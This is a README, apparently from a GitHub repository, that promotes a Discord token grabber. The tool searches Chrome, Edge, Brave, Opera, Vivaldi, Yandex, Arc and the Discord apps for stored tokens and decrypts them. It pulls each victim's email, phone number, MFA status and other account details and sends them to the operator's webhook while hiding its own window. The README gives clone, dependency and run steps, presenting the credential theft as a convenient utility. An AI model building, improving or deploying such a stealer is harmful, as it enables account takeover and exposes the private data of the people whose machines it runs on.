built it because I wanted something that actually covers a lot of browsers without turning into a bloated mess. Works quietly, hides the console, and gets the job done.
�
�
�
What it does
Scans a bunch of browsers: Chrome (including profiles), Edge, Brave, Opera/GX, Vivaldi, Yandex, Arc, plus the official Discord apps.
Handles decryption properly using Windows DPAPI + AES-GCM for the newer v10 tokens.
Pulls real user info from Discord's API for each token — username, global name, email, phone number, verification status, MFA, Nitro type, user ID, and avatar.
Sends clean, readable embeds to your webhook so you don't have to dig through raw text.
Keeps things duplicate-free and limits the output so you don't spam yourself.
Runs hidden by default (console disappears after it starts).
It's not the stealthiest thing on earth, but for quick grabs it works pretty damn well.
Requirements
Windows 10 or 11
Python 3.8 or newer
These packages:
pip install pywin32 pycryptodome requests
How to set it up
Clone the repo (or just download the files):
git clone https://github.com/aqua999-hub/discord-token-grabber.git
cd discord-token-grabber
Install the dependencies:
pip install pywin32 pycryptodome requests
Open main.py and put your own webhook URL in there (replace the placeholder).
How to use it
Make sure the webhook URL is set.
Run the script:
python grabber.py
You'll see "Running grabber..." for a second, then the window hides itself.
Go check your Discord — the webhook should fire off with embeds showing every token it found plus all the account details.
